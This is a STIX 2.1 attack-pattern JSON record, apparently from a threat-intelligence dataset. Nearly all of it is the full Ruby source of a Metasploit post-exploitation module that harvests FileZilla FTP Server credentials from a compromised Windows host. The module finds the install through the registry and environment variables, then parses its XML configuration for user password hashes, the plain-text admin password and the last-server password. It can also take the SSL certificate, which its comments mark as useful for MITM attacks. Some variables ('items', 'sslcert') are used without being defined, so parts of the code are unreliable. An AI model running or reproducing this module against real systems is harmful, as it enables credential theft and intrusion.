{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2044c024-9d1d-43da-882c-03144dddbd1c",
    "created": "2024-08-14T16:33:08.763444Z",
    "modified": "2024-08-14T16:33:08.763448Z",
    "name": "Windows Gather FileZilla FTP Server Credential Collection",
    "description": "This module will collect credentials from the FileZilla FTP server if installed. 'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/filezilla_server.rb",
            "external_id": "filezilla_server.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rexml/document'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather FileZilla FTP Server Credential Collection',\n        'Description' => %q{ This module will collect credentials from the FileZilla FTP server if installed. },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'bannedit', # original idea & module\n          'g0tmi1k' # @g0tmi1k // https://blog.g0tmi1k.com/ - additional features\n        ],\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              core_channel_write\n              stdapi_registry_query_value_direct\n              stdapi_sys_config_getenv\n              stdapi_sys_config_getuid\n            ]\n          }\n        }\n      )\n    )\n\n    register_options([\n      OptBool.new('SSLCERT', [false, 'Loot the SSL Certificate if its there?', false]), # useful perhaps for MITM\n    ])\n  end\n\n  def run\n    if session.type != 'meterpreter'\n      print_error 'Only meterpreter sessions are supported by this post module'\n      return\n    end\n\n    progfiles_env = session.sys.config.getenvs('ProgramFiles', 'ProgramFiles(x86)', 'ProgramW6432')\n    locations = []\n    progfiles_env.each do |_k, v|\n      next if v.blank?\n\n      locations << v + '\\\\FileZilla Server\\\\'\n    end\n\n    keys = [\n      'HKLM\\\\SOFTWARE\\\\FileZilla Server',\n      'HKLM\\\\SOFTWARE\\\\Wow6432Node\\\\FileZilla Server',\n    ]\n\n    keys.each do |key|\n      begin\n        root_key, base_key = session.sys.registry.splitkey(key)\n        value = session.sys.registry.query_value_direct(root_key, base_key, 'install_dir')\n      rescue Rex::Post::Meterpreter::RequestError => e\n        vprint_error(e.message)\n        next\n      end\n      locations << value.data + '\\\\'\n    end\n\n    locations = locations.uniq\n    filezilla = check_filezilla(locations)\n    get_filezilla_creds(filezilla) if filezilla\n  end\n\n  def check_filezilla(locations)\n    paths = []\n    begin\n      locations.each do |location|\n        print_status(\"Checking for Filezilla Server directory in: #{location}\")\n        begin\n          session.fs.dir.foreach(location.to_s) do |fdir|\n            ['FileZilla Server.xml', 'FileZilla Server Interface.xml'].each do |xmlfile|\n              next unless fdir == xmlfile\n\n              filepath = location + xmlfile\n              print_good(\"Configuration file found: #{filepath}\")\n              paths << filepath\n            end\n          end\n        rescue Rex::Post::Meterpreter::RequestError => e\n          vprint_error(e.message)\n        end\n      end\n    rescue ::Exception => e\n      print_error(e.to_s)\n      return\n    end\n\n    if !paths.empty?\n      print_good(\"Found FileZilla Server on #{sysinfo['Computer']} via session ID: #{session.sid}\")\n      print_line\n      return paths\n    end\n\n    return nil\n  end\n\n  def get_filezilla_creds(paths)\n    fs_xml = '' # FileZilla Server.xml           - Settings for the local install\n    fsi_xml = '' # FileZilla Server Interface.xml - Last server used with the interface\n    credentials = Rex::Text::Table.new(\n      'Header' => 'FileZilla FTP Server Credentials',\n      'Indent' => 1,\n      'Columns' =>\n      [\n        'Host',\n        'Port',\n        'User',\n        'Password',\n        'SSL'\n      ]\n    )\n\n    permissions = Rex::Text::Table.new(\n      'Header' => 'FileZilla FTP Server Permissions',\n      'Indent' => 1,\n      'Columns' =>\n      [\n        'Host',\n        'User',\n        'Dir',\n        'FileRead',\n        'FileWrite',\n        'FileDelete',\n        'FileAppend',\n        'DirCreate',\n        'DirDelete',\n        'DirList',\n        'DirSubdirs',\n        'AutoCreate',\n        'Home'\n      ]\n    )\n\n    configuration = Rex::Text::Table.new(\n      'Header' => 'FileZilla FTP Server Configuration',\n      'Indent' => 1,\n      'Columns' =>\n      [\n        'FTP Port',\n        'FTP Bind IP',\n        'Admin Port',\n        'Admin Bind IP',\n        'Admin Password',\n        'SSL',\n        'SSL Certfile',\n        'SSL Key Password'\n      ]\n    )\n\n    lastserver = Rex::Text::Table.new(\n      'Header' => 'FileZilla FTP Last Server',\n      'Indent' => 1,\n      'Columns' =>\n      [\n        'IP',\n        'Port',\n        'Password'\n      ]\n    )\n\n    paths.each do |path|\n      file = session.fs.file.new(path, 'rb')\n      until file.eof?\n        if path.include? 'FileZilla Server.xml'\n          fs_xml << file.read\n        elsif path.include? 'FileZilla Server Interface.xml'\n          fsi_xml << file.read\n        end\n      end\n      file.close\n    end\n\n    # user credentials password is just an MD5 hash\n    # admin pass is just plain text. Priorities?\n    creds, perms, config = parse_server(fs_xml)\n\n    creds.each do |cred|\n      credentials << [cred['host'], cred['port'], cred['user'], cred['password'], cred['ssl']]\n\n      session.db_record ? (source_id = session.db_record.id) : (source_id = nil)\n\n      service_data = {\n        address: session.session_host,\n        port: config['ftp_port'],\n        service_name: 'ftp',\n        protocol: 'tcp',\n        workspace_id: myworkspace_id\n      }\n\n      credential_data = {\n        origin_type: :session,\n        jtr_format: 'raw-md5',\n        session_id: session_db_id,\n        post_reference_name: refname,\n        private_type: :nonreplayable_hash,\n        private_data: cred['password'],\n        username: cred['user']\n      }\n\n      credential_data.merge!(service_data)\n\n      credential_core = create_credential(credential_data)\n\n      # Assemble the options hash for creating the Metasploit::Credential::Login object\n      login_data = {\n        core: credential_core,\n        status: Metasploit::Model::Login::Status::UNTRIED\n      }\n\n      # Merge in the service data and create our Login\n      login_data.merge!(service_data)\n      create_credential_login(login_data)\n    end\n\n    perms.each do |perm|\n      permissions << [\n        perm['host'], perm['user'], perm['dir'], perm['fileread'], perm['filewrite'],\n        perm['filedelete'], perm['fileappend'], perm['dircreate'], perm['dirdelete'], perm['dirlist'],\n        perm['dirsubdirs'], perm['autocreate'], perm['home']\n      ]\n    end\n\n    session.db_record ? (source_id = session.db_record.id) : (source_id = nil)\n\n    # report the goods!\n    if config['admin_pass'] == '<none>'\n      vprint_status('Detected Default Adminstration Settings:')\n    else\n      vprint_status('Collected the following configuration details:')\n      service_data = {\n        address: session.session_host,\n        port: config['admin_port'],\n        service_name: 'filezilla-admin',\n        protocol: 'tcp',\n        workspace_id: myworkspace_id\n      }\n\n      credential_data = {\n        origin_type: :session,\n        session_id: session_db_id,\n        post_reference_name: refname,\n        private_type: :password,\n        private_data: config['admin_pass'],\n        username: 'admin'\n      }\n\n      credential_data.merge!(service_data)\n\n      credential_core = create_credential(credential_data)\n\n      # Assemble the options hash for creating the Metasploit::Credential::Login object\n      login_data = {\n        core: credential_core,\n        status: Metasploit::Model::Login::Status::UNTRIED\n      }\n\n      # Merge in the service data and create our Login\n      login_data.merge!(service_data)\n      create_credential_login(login_data)\n    end\n\n    vprint_status(\"       FTP Port: #{config['ftp_port']}\")\n    vprint_status(\"    FTP Bind IP: #{config['ftp_bindip']}\")\n    vprint_status(\"            SSL: #{config['ssl']}\")\n    vprint_status(\"     Admin Port: #{config['admin_port']}\")\n    vprint_status(\"  Admin Bind IP: #{config['admin_bindip']}\")\n    vprint_status(\"     Admin Pass: #{config['admin_pass']}\")\n    vprint_line\n\n    configuration << [\n      config['ftp_port'], config['ftp_bindip'], config['admin_port'], config['admin_bindip'],\n      config['admin_pass'], config['ssl'], config['ssl_certfile'], config['ssl_keypass']\n    ]\n\n    begin\n      lastser = parse_interface(fsi_xml)\n      lastserver << [lastser['ip'], lastser['port'], lastser['password']]\n      vprint_status('Last Server Information:')\n      vprint_status(\"         IP: #{lastser['ip']}\")\n      vprint_status(\"       Port: #{lastser['port']}\")\n      vprint_status(\"   Password: #{lastser['password']}\")\n      vprint_line\n    rescue StandardError\n      vprint_error('Could not parse FileZilla Server Interface.xml')\n    end\n    loot_path = store_loot('filezilla.server.creds', 'text/csv', session, credentials.to_csv,\n                           'filezilla_server_credentials.csv', 'FileZilla FTP Server Credentials')\n    print_status(\"Credentials saved in: #{loot_path}\")\n\n    loot_path = store_loot('filezilla.server.perms', 'text/csv', session, permissions.to_csv,\n                           'filezilla_server_permissions.csv', 'FileZilla FTP Server Permissions')\n    print_status(\"Permissions saved in: #{loot_path}\")\n\n    loot_path = store_loot('filezilla.server.config', 'text/csv', session, configuration.to_csv,\n                           'filezilla_server_configuration.csv', 'FileZilla FTP Server Configuration')\n    print_status(\"     Config saved in: #{loot_path}\")\n\n    loot_path = store_loot('filezilla.server.lastser', 'text/csv', session, lastserver.to_csv,\n                           'filezilla_server_lastserver.csv', 'FileZilla FTP Last Server')\n    print_status(\" Last server history: #{loot_path}\")\n\n    print_line\n  end\n\n  def parse_server(data)\n    creds = []\n    perms = []\n    groups = []\n    settings = {}\n    users = 0\n    passwords = 0\n\n    begin\n      doc = REXML::Document.new(data).root\n    rescue REXML::ParseException\n      print_error('Invalid xml format')\n    end\n\n    opt = doc.elements.to_a('Settings/Item')\n    if opt[1].nil? # Default value will only have a single line, for admin port - no adminstration settings\n      settings['admin_port'] = begin\n        opt[0].text\n      rescue StandardError\n        '<none>'\n      end\n      settings['ftp_port'] = 21\n    else\n      settings['ftp_port'] = begin\n        opt[0].text\n      rescue StandardError\n        21\n      end\n      settings['admin_port'] = begin\n        opt[16].text\n      rescue StandardError\n        '<none>'\n      end\n    end\n    settings['admin_pass'] = begin\n      opt[17].text\n    rescue StandardError\n      '<none>'\n    end\n    settings['local_host'] = begin\n      opt[18].text\n    rescue StandardError\n      ''\n    end\n    settings['bindip'] = begin\n      opt[38].text\n    rescue StandardError\n      ''\n    end\n    settings['ssl'] = begin\n      opt[42].text\n    rescue StandardError\n      ''\n    end\n\n    # empty means localhost only * is 0.0.0.0\n    if settings['local_host']\n      settings['admin_bindip'] = settings['local_host']\n    else\n      settings['admin_bindip'] = '127.0.0.1'\n    end\n    settings['admin_bindip'] = '0.0.0.0' if settings['admin_bindip'] == '*' || settings['admin_bindip'].empty?\n\n    if settings['bindip']\n      settings['ftp_bindip'] = settings['bindip']\n    else\n      settings['ftp_bindip'] = '127.0.0.1'\n    end\n    settings['ftp_bindip'] = '0.0.0.0' if settings['ftp_bindip'] == '*' || settings['ftp_bindip'].empty?\n\n    settings['ssl'] = settings['ssl'] == '1'\n    if !settings['ssl'] && datastore['SSLCERT']\n      print_error('Cannot loot the SSL Certificate, SSL is disabled in the configuration file')\n    end\n\n    settings['ssl_certfile'] = begin\n      items[45].text\n    rescue StandardError\n      '<none>'\n    end\n    # Get the file if it is there. It could be useful in MITM attacks\n    if settings['ssl_certfile'] != '<none>' && settings['ssl'] && datastore['SSLCERT']\n      sslfile = session.fs.file.new(settings['ssl_certfile'])\n      sslcert << sslfile.read until sslfile.eof?\n      store_loot('filezilla.server.ssl.cert', 'text/plain', session, sslfile,\n                 settings['ssl_cert'] + '.txt', 'FileZilla Server SSL Certificate File')\n      print_status('Looted SSL Certificate File')\n    end\n\n    settings['ssl_certfile'] = '<none>' if settings['ssl_certfile'].nil?\n\n    settings['ssl_keypass'] = begin\n      items[50].text\n    rescue StandardError\n      '<none>'\n    end\n    settings['ssl_keypass'] = '<none>' if settings['ssl_keypass'].nil?\n\n    vprint_status('Collected the following credentials:') if doc.elements['Users']\n\n    doc.elements.each('Users/User') do |user|\n      account = {}\n      opt = user.elements.to_a('Option')\n      account['user'] = begin\n        user.attributes['Name']\n      rescue StandardError\n        '<none>'\n      end\n      account['password'] = begin\n        opt[0].text\n      rescue StandardError\n        '<none>'\n      end\n      account['group'] = begin\n        opt[1].text\n      rescue StandardError\n        '<none>'\n      end\n      users += 1\n      passwords += 1\n      groups << account['group']\n\n      user.elements.to_a('Permissions/Permission').each do |permission|\n        perm = {}\n        opt = permission.elements.to_a('Option')\n        perm['user'] = begin\n          user.attributes['Name']\n        rescue StandardError\n          '<unknown>'\n        end\n        perm['dir'] = begin\n          permission.attributes['Dir']\n        rescue StandardError\n          '<unknown>'\n        end\n        perm['fileread'] = begin\n          opt[0].text\n        rescue StandardError\n          '<unknown>'\n        end\n        perm['filewrite'] = begin\n          opt[1].text\n        rescue StandardError\n          '<unknown>'\n        end\n        perm['filedelete'] = begin\n          opt[2].text\n        rescue StandardError\n          '<unknown>'\n        end\n        perm['fileappend'] = begin\n          opt[3].text\n        rescue StandardError\n          '<unknown>'\n        end\n        perm['dircreate'] = begin\n          opt[4].text\n        rescue StandardError\n          '<unknown>'\n        end\n        perm['dirdelete'] = begin\n          opt[5].text\n        rescue StandardError\n          '<unknown>'\n        end\n        perm['dirlist'] = begin\n          opt[6].text\n        rescue StandardError\n          '<unknown>'\n        end\n        perm['dirsubdirs'] = begin\n          opt[7].text\n        rescue StandardError\n          '<unknown>'\n        end\n        perm['autocreate'] = begin\n          opt[9].text\n        rescue StandardError\n          '<unknown>'\n        end\n        perm['host'] = settings['ftp_bindip']\n\n        opt[8].text == '1' ? (perm['home'] = 'true') : (perm['home'] = 'false')\n\n        perms << perm\n      end\n\n      user.elements.to_a('IpFilter/Allowed').each do |allowed|\n      end\n      user.elements.to_a('IpFilter/Disallowed').each do |disallowed|\n      end\n\n      account['host'] = settings['ftp_bindip']\n      account['port'] = settings['ftp_port']\n      account['ssl'] = settings['ssl'].to_s\n      creds << account\n\n      vprint_status(\"    Username: #{account['user']}\")\n      vprint_status(\"    Password: #{account['password']}\")\n      vprint_status(\"       Group: #{account['group']}\") if account['group']\n      vprint_line\n    end\n\n    # Rather than printing out all the values, just count up\n    groups = groups.uniq unless groups.uniq.nil?\n    if !datastore['VERBOSE']\n      print_status('Collected the following credentials:')\n      print_status(\"    Usernames: #{users}\")\n      print_status(\"    Passwords: #{passwords}\")\n      print_status(\"       Groups: #{groups.length}\")\n      print_line\n    end\n    return [creds, perms, settings]\n  end\n\n  def parse_interface(data)\n    lastser = {}\n\n    begin\n      doc = REXML::Document.new(data).root\n    rescue REXML::ParseException\n      print_error('Invalid xml format')\n      return lastser\n    end\n\n    opt = doc.elements.to_a('Settings/Item')\n\n    opt.each do |item|\n      case item.attributes['name']\n      when /Address/\n        lastser['ip'] = item.text\n      when /Port/\n        lastser['port'] = item.text\n      when /Password/\n        lastser['password'] = item.text\n      end\n    end\n\n    lastser['password'] = '<none>' if lastser['password'].nil?\n\n    lastser\n  end\n\n  def got_root?\n    session.sys.config.getuid =~ /SYSTEM/ ? true : false\n  end\n\n  def whoami\n    session.sys.config.getenv('USERNAME')\n  end\nend\n",
    "x_mitre_platforms": [
        "['win']"
    ]
}